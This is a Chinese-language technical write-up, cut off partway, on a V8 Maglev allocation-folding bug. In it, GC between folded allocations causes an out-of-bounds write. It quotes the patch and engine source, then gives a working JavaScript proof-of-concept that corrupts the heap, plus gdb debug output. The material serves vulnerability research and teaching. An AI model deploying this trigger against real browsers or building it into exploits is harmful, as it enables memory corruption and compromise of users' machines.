<p>补丁很简单就添加了一个函数<code>ClearCurrentRawAllocation()</code>，该函数如下，其目的就是将<code>current_raw_allocation_</code>指针置为空，下面我们来分析一下这个指针的作用以及为何会触发漏洞。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MaglevGraphBuilder::ClearCurrentRawAllocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  current_raw_allocation_ = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分配折叠"><a href="#分配折叠" class="headerlink" title="分配折叠"></a>分配折叠</h3><p>Maglev试图通过将多次内存分配合并为单个大分配来优化内存分配策略。其核心机制是维护一个指向最后一次执行内存分配的节点（AllocateRaw节点）的指针。当后续出现新的内存请求时，系统会执行若干检查：若条件满足，则会直接扩展前次分配的容量，将新请求的大小累加到原有分配上。例如，若先前请求分配了12字节内存，后续又请求88字节，Maglev会将第一次分配扩展为100字节，并完全消除第二次独立分配。此时前12字节用于原始请求，后续88字节空间则服务于第二次请求。</p>
<p>当Maglev执行代码降级(lowering)并遇到需要内存分配的场景时，会调用MaglevGraphBuilder::ExtendOrReallocateCurrentRawAllocation()函数。该函数的源代码实现如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// File: src/maglev/maglev-graph-builder.cc</span></span><br><span class="line"></span><br><span class="line"><span class="function">ValueNode* <span class="title">MaglevGraphBuilder::ExtendOrReallocateCurrentRawAllocation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> size, AllocationType allocation_type)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (!current_raw_allocation_ ||</span><br><span class="line">      current_raw_allocation_-＞<span class="built_in">allocation_type</span>() != allocation_type ||</span><br><span class="line">      !v8_flags.inline_new) &#123;</span><br><span class="line">    current_raw_allocation_ =</span><br><span class="line">        AddNewNode＜AllocateRaw＞(&#123;&#125;, allocation_type, size);</span><br><span class="line">    <span class="keyword">return</span> current_raw_allocation_;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> current_size = current_raw_allocation_-＞<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">if</span> (current_size + size ＞ kMaxRegularHeapObjectSize) &#123;</span><br><span class="line">    <span class="keyword">return</span> current_raw_allocation_ =</span><br><span class="line">               AddNewNode＜AllocateRaw＞(&#123;&#125;, allocation_type, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">DCHECK_GT</span>(current_size, <span class="number">0</span>);</span><br><span class="line">  <span class="type">int</span> previous_end = current_size;</span><br><span class="line">  current_raw_allocation_-＞<span class="built_in">extend</span>(size);</span><br><span class="line">  <span class="keyword">return</span> AddNewNode＜FoldedAllocation＞(&#123;current_raw_allocation_&#125;, previous_end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数的目标是 <strong>合并连续的内存分配请求</strong> 以减少内存分配次数。通过复用或扩展前一次分配，避免频繁调用内存分配器，提升性能。假设连续两次调用：</p>
<ol>
<li><code>ExtendOrReallocateCurrentRawAllocation(12, NEW_SPACE)</code><ul>
<li>首次无当前分配 → 创建 <code>AllocateRaw(12)</code>，<code>current_raw_allocation_</code> 指向它。</li>
</ul>
</li>
<li><code>ExtendOrReallocateCurrentRawAllocation(88, NEW_SPACE)</code><ul>
<li>类型相同且未超限 → 扩展 <code>AllocateRaw</code> 至 100 字节，返回 <code>FoldedAllocation</code> 节点指向偏移 12。</li>
</ul>
</li>
</ol>
<p>内存布局：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[AllocateRaw(100)][FoldedAllocation(offset=12)]</span><br><span class="line">|----12----|----88----|</span><br></pre></td></tr></table></figure>

<p>Maglev通过这种方式优化内存分配次数，在代码中该技术被称为<strong>分配折叠（Allocation Folding）</strong>，而那些通过扩展前一次分配大小而被优化掉的分配则称为<strong>折叠式分配（Folded Allocations）</strong>。然而，这里存在一个与**垃圾回收（Garbage Collection, GC）**相关的隐患。如之前章节所述，V8引擎采用**移动式垃圾回收器（Moving Garbage Collector）**。因此，如果在两次“折叠式”分配之间触发了GC，会导致以下问题：</p>
<ol>
<li><strong>第一次分配的对象被移动</strong><br>GC会将第一个分配已初始化的对象移动到堆中的其他位置（例如内存整理期间）。</li>
<li><strong>为第二次分配保留的空间被释放</strong><br>由于GC发生在第一个对象初始化之后、第二个对象初始化之前，GC无法感知到第二个分配的存在（此时第二个对象尚未初始化）。因此，GC会认为原分配空间中为第二个对象预留的部分是“空闲内存”，并将其释放。</li>
<li><strong>越界写入风险</strong><br>当后续尝试初始化第二个对象时，<code>FoldedAllocation</code>节点会基于原始分配的偏移量（例如偏移12字节）计算地址。但由于第一个对象已被移动，原始分配的内存可能已被回收或重新分配，此时基于旧地址的偏移量写入数据将导致<strong>越界写入（Out-of-Bounds Write）</strong>。</li>
</ol>
<h3 id="BuildAllocateFastObject函数"><a href="#BuildAllocateFastObject函数" class="headerlink" title="BuildAllocateFastObject函数"></a>BuildAllocateFastObject函数</h3><p><code>BuildAllocateFastObject()</code> 函数是对 <code>ExtendOrReallocateCurrentRawAllocation()</code> 的<strong>封装函数</strong>，其核心功能是**通过多次调用 <code>ExtendOrReallocateCurrentRawAllocation()</code>**，代码如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// File: src/maglev/maglev-graph-builder.cc</span></span><br><span class="line"><span class="function">ValueNode* <span class="title">MaglevGraphBuilder::BuildAllocateFastObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    FastObject object, AllocationType allocation_type)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[TRUNCATED]</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">  ValueNode* allocation = <span class="built_in">ExtendOrReallocateCurrentRawAllocation</span>(</span><br><span class="line">      object.instance_size, allocation_type);</span><br><span class="line"></span><br><span class="line">[TRUNCATED]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> allocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如 [1] 处代码所示，<code>BuildAllocateFastObject()</code> 函数在需要分配内存时会调用 <code>ExtendOrReallocateCurrentRawAllocation()</code>，随后将分配的内存初始化为对象数据。此过程中有一个<strong>关键设计细节</strong>：该函数<strong>不会在完成后主动清除 <code>current_raw_allocation_</code> 变量</strong>，而是将此责任交给调用方，由其在适当时机通过调用 <code>MaglevGraphBuilder</code> 的辅助函数 <code>ClearCurrentRawAllocation()</code> 将 <code>current_raw_allocation_</code> 置为 <code>NULL</code>。若未正确清理此变量，可能导致<strong>跨 GC 边界的错误折叠分配</strong>，进而引发越界写入漏洞。</p>
<h3 id="VisitFindNonDefaultConstructorOrConstruct函数"><a href="#VisitFindNonDefaultConstructorOrConstruct函数" class="headerlink" title="VisitFindNonDefaultConstructorOrConstruct函数"></a>VisitFindNonDefaultConstructorOrConstruct函数</h3><p>FindNonDefaultConstructorOrConstruct（查找非默认构造函数或构造）字节码操作码用于构建对象实例。该操作码会从构造函数的超构造函数开始沿着原型链向上遍历，直到发现一个非默认构造函数。正如我们之前在测试案例中看到的情况，如果最终遍历到默认的基构造函数（如基础场景），则会创建该对象的实例。</p>
<p>Maglev编译器通过调用VisitFindNonDefaultConstructorOrConstruct()函数，将这个操作码转换为Maglev中间表示（IR）。该函数代码如下。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// File: src/maglev/maglev-graph-builder.cc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MaglevGraphBuilder::VisitFindNonDefaultConstructorOrConstruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ValueNode* this_function = <span class="built_in">LoadRegisterTagged</span>(<span class="number">0</span>);</span><br><span class="line">  ValueNode* new_target = <span class="built_in">LoadRegisterTagged</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">auto</span> register_pair = iterator_.<span class="built_in">GetRegisterPairOperand</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// [1]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">TryBuildFindNonDefaultConstructorOrConstruct</span>(this_function, new_target,</span><br><span class="line">                                                   register_pair)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [2]</span></span><br><span class="line"></span><br><span class="line">  CallBuiltin* result =</span><br><span class="line">      <span class="built_in">BuildCallBuiltin</span>(</span><br><span class="line">          &#123;this_function, new_target&#125;);</span><br><span class="line">  <span class="built_in">StoreRegisterPair</span>(register_pair, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以发现其在[1]处调用了**TryBuildFindNonDefaultConstructorOrConstruct()**函数，该函数就是我们此次漏洞所在的地方，下面我们来看一下这个函数</p>
<h3 id="TryBuildFindNonDefaultConstructorOrConstruct函数"><a href="#TryBuildFindNonDefaultConstructorOrConstruct函数" class="headerlink" title="TryBuildFindNonDefaultConstructorOrConstruct函数"></a>TryBuildFindNonDefaultConstructorOrConstruct函数</h3><p>这个函数代码如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MaglevGraphBuilder::TryBuildFindNonDefaultConstructorOrConstruct</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    ValueNode* this_function, ValueNode* new_target,</span></span></span><br><span class="line"><span class="params"><span class="function">    std::pair&lt;interpreter::Register, interpreter::Register&gt; result)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// See also:</span></span><br><span class="line">  <span class="comment">// JSNativeContextSpecialization::ReduceJSFindNonDefaultConstructorOrConstruct</span></span><br><span class="line"></span><br><span class="line">  compiler::OptionalHeapObjectRef maybe_constant =</span><br><span class="line">      <span class="built_in">TryGetConstant</span>(this_function);</span><br><span class="line">  <span class="keyword">if</span> (!maybe_constant) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  compiler::MapRef function_map = maybe_constant-&gt;<span class="built_in">map</span>(<span class="built_in">broker</span>());</span><br><span class="line">  compiler::HeapObjectRef current = function_map.<span class="built_in">prototype</span>(<span class="built_in">broker</span>());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// TODO(v8:13091): Don&#x27;t produce incomplete stack traces when debug is active.</span></span><br><span class="line">  <span class="comment">// We already deopt when a breakpoint is set. But it would be even nicer to</span></span><br><span class="line">  <span class="comment">// avoid producting incomplete stack traces when when debug is active, even if</span></span><br><span class="line">  <span class="comment">// there are no breakpoints - then a user inspecting stack traces via Dev</span></span><br><span class="line">  <span class="comment">// Tools would always see the full stack trace.</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!current.<span class="built_in">IsJSFunction</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    compiler::JSFunctionRef current_function = current.<span class="built_in">AsJSFunction</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are class fields, bail out. TODO(v8:13091): Handle them here.</span></span><br><span class="line">    <span class="keyword">if</span> (current_function.<span class="built_in">shared</span>(<span class="built_in">broker</span>())</span><br><span class="line">            .<span class="built_in">requires_instance_members_initializer</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are private methods, bail out. TODO(v8:13091): Handle them here.</span></span><br><span class="line">    <span class="keyword">if</span> (current_function.<span class="built_in">context</span>(<span class="built_in">broker</span>())</span><br><span class="line">            .<span class="built_in">scope_info</span>(<span class="built_in">broker</span>())</span><br><span class="line">            .<span class="built_in">ClassScopeHasPrivateBrand</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FunctionKind kind = current_function.<span class="built_in">shared</span>(<span class="built_in">broker</span>()).<span class="built_in">kind</span>();</span><br><span class="line">    <span class="keyword">if</span> (kind != FunctionKind::kDefaultDerivedConstructor) &#123;</span><br><span class="line">      <span class="comment">// The hierarchy walk will end here; this is the last change to bail out</span></span><br><span class="line">      <span class="comment">// before creating new nodes.</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">broker</span>()-&gt;<span class="built_in">dependencies</span>()-&gt;<span class="built_in">DependOnArrayIteratorProtector</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      compiler::OptionalHeapObjectRef new_target_function =</span><br><span class="line">          <span class="built_in">TryGetConstant</span>(new_target);</span><br><span class="line">      <span class="keyword">if</span> (kind == FunctionKind::kDefaultBaseConstructor) &#123;</span><br><span class="line">        <span class="comment">// Store the result register first, so that a lazy deopt in</span></span><br><span class="line">        <span class="comment">// `FastNewObject` writes `true` to this register.</span></span><br><span class="line">        <span class="built_in">StoreRegister</span>(result.first, <span class="built_in">GetBooleanConstant</span>(<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">        ValueNode* object;</span><br><span class="line">        <span class="keyword">if</span> (new_target_function &amp;&amp; new_target_function-&gt;<span class="built_in">IsJSFunction</span>() &amp;&amp;</span><br><span class="line">            <span class="built_in">HasValidInitialMap</span>(new_target_function-&gt;<span class="built_in">AsJSFunction</span>(),</span><br><span class="line">                               current_function)) &#123;</span><br><span class="line">          object = <span class="built_in">BuildAllocateFastObject</span>(</span><br><span class="line">              <span class="built_in">FastObject</span>(new_target_function-&gt;<span class="built_in">AsJSFunction</span>(), <span class="built_in">zone</span>(), <span class="built_in">broker</span>()),</span><br><span class="line">              AllocationType::kYoung);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          object = <span class="built_in">BuildCallBuiltin</span>&lt;Builtin::kFastNewObject&gt;(</span><br><span class="line">              &#123;<span class="built_in">GetConstant</span>(current_function), new_target&#125;);</span><br><span class="line">          <span class="comment">// We&#x27;ve already stored &quot;true&quot; into result.first, so a deopt here just</span></span><br><span class="line">          <span class="comment">// has to store result.second. Also mark result.first as being used,</span></span><br><span class="line">          <span class="comment">// since the lazy deopt frame won&#x27;t have marked it since it used to be</span></span><br><span class="line">          <span class="comment">// a result register.</span></span><br><span class="line">          current_interpreter_frame_.<span class="built_in">get</span>(result.first)-&gt;<span class="built_in">add_use</span>();</span><br><span class="line">          object-&gt;<span class="built_in">lazy_deopt_info</span>()-&gt;<span class="built_in">UpdateResultLocation</span>(result.second, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">StoreRegister</span>(result.second, object);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">StoreRegister</span>(result.first, <span class="built_in">GetBooleanConstant</span>(<span class="literal">false</span>));</span><br><span class="line">        <span class="built_in">StoreRegister</span>(result.second, <span class="built_in">GetConstant</span>(current));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">broker</span>()-&gt;<span class="built_in">dependencies</span>()-&gt;<span class="built_in">DependOnStablePrototypeChain</span>(</span><br><span class="line">          function_map, WhereToStart::kStartAtReceiver, current_function);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Keep walking up the class tree.</span></span><br><span class="line">    current = current_function.<span class="built_in">map</span>(<span class="built_in">broker</span>()).<span class="built_in">prototype</span>(<span class="built_in">broker</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数的本质就是遍历正在构造对象的原型链，以便找出的一个非默认构造函数，并利用该信息来构造对象实例。为了确保漏洞利用条件，我们可以先看一下这个函数。</p>
<p>首先在开头我们可以发现被构造实例的对象必须是”常量”。而后面则开始遍历原型链。循环中的<strong>current_function</strong>保存当前父对象的构造函数，若某个父类构造函数并非函数类型，则循环会终止。</p>
<p>后面则会通过<code>FunctionKind</code>枚举来判断当前父类构造函数的类型，若为默认派生构造函数，则会跳转至结尾，反之则会进入处理非默认构造函数的代码块。之后会有一个关键操作就是验证<code>new.target</code>的常量性，之后会进一步确定其是否是有效常量，若是则会通过条件，之后便会调用函数<code>BuildAllocateFastObject(new_target)</code>，该函数内部会调用<code>ExtendOrReallocateCurrentRawAllocation(int size, AllocationType allocation_type)</code>函数，而在调用<code>BuildAllocateFastObject()</code>函数后，其不会清理<code>current_raw_allocation_</code>常量，那么如果原始分配和折叠分配的期间，触发了垃圾回收，就会导致越界读写。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>下面我们就可以开始进行对漏洞的利用了</p>
<h3 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><p>首先我们来写一段poc来了解一下该漏洞可以完成的操作以便后续来进行漏洞利用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> empty_object = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> empty_array = [];</span><br><span class="line"><span class="keyword">let</span> corrupted_instance = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> dogc_flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">let</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer);</span><br><span class="line"><span class="keyword">let</span> b64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dogc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dogc_flag == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">900</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassParent</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassBug</span> <span class="keyword">extends</span> <span class="title class_ inherited__">ClassParent</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">a20, a21, a22</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> v24 = <span class="keyword">new</span> <span class="keyword">new</span>.<span class="title function_">target</span>();</span><br><span class="line">        <span class="keyword">let</span> x = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="keyword">let</span> a = [<span class="number">1.1</span>];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = x;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">a</span> = a;</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(empty_array);</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="number">1</span>] = <span class="title function_">dogc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">    dogc_flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) dogc_flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="title function_">dogc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">650</span>; i++) &#123;</span><br><span class="line">    dogc_flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">644</span> || i == <span class="number">645</span> || i == <span class="number">646</span> || i == <span class="number">640</span>) &#123;</span><br><span class="line">        dogc_flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="title function_">dogc</span>();</span><br><span class="line">        dogc_flag = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">646</span>) dogc_flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="title class_">Reflect</span>.<span class="title function_">construct</span>(<span class="title class_">ClassBug</span>, empty_array, <span class="title class_">ClassParent</span>);</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">646</span>) &#123;</span><br><span class="line">        corrupted_instance = x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> x = corrupted_instance.<span class="property">x</span>;</span><br><span class="line"><span class="keyword">let</span> a = corrupted_instance.<span class="property">a</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(corrupted_instance);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(x);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在realse模式下执行该代码，并使用gdb查看布局结果如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">------- this -------</span><br><span class="line">DebugPrint: 0x25550030adad: [JS_OBJECT_TYPE] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x25550030a5f5 &lt;Map[20](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x2555001a3f69 &lt;ClassParent map = 0x25550030a59d&gt;</span><br><span class="line"> - elements: 0x255500202a29 &lt;FixedArray[19]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x2555000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x255500002af1: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#x: 0x25550030ad9d &lt;JSArray[8]&gt; (const data field 0), location: in-object</span></span><br><span class="line">    0x255500002981: [String] <span class="keyword">in</span> 